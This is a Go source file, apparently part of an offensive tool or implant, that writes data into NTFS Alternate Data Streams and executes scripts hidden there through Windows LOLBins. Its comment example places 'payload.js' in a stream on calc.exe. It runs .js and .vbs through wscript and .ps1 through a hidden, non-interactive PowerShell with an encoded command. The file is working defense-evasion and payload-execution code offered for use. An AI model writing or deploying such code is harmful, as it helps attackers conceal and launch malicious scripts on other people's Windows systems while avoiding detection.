//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

// adsWrite writes data to an NTFS Alternate Data Stream.
// path must be in the form "C:\host_file.txt:stream_name" or "C:\dir:stream_name".
// The host file is created if it does not exist.
func adsWrite(path string, data []byte) error {
	if !strings.Contains(path, ":") || strings.Count(path, ":") < 2 {
		// Windows paths have one colon for the drive letter — ADS needs a second colon
		return fmt.Errorf("invalid ADS path: must be <drive:path:stream>, e.g. C:\\file.txt:hidden")
	}
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		return fmt.Errorf("open ADS: %w", err)
	}
	defer f.Close()
	_, err = f.Write(data)
	return err
}

// adsRead reads data from an NTFS Alternate Data Stream.
func adsRead(path string) ([]byte, error) {
	return os.ReadFile(path)
}

// adsExec executes a script stored in an NTFS ADS via an appropriate LOLBin.
// Supported extensions: .js (WScript JScript), .vbs (WScript VBScript), .ps1 (PowerShell).
// Example: "C:\windows\system32\calc.exe:payload.js"
func adsExec(path string) (string, error) {
	lower := strings.ToLower(path)
	var cmd *exec.Cmd

	switch {
	case strings.HasSuffix(lower, ".js"):
		cmd = exec.Command("wscript.exe", "//E:jscript", path)
	case strings.HasSuffix(lower, ".vbs"):
		cmd = exec.Command("wscript.exe", path)
	case strings.HasSuffix(lower, ".ps1"):
		encoded := psEncode(fmt.Sprintf(`. "%s"`, path))
		cmd = exec.Command("powershell.exe",
			"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
			"-EncodedCommand", encoded,
		)
	default:
		return "", fmt.Errorf("unsupported ADS extension %q — use .js, .vbs, or .ps1", path[strings.LastIndex(path, "."):])
	}

	out, err := cmd.CombinedOutput()
	return strings.TrimSpace(string(out)), err
}
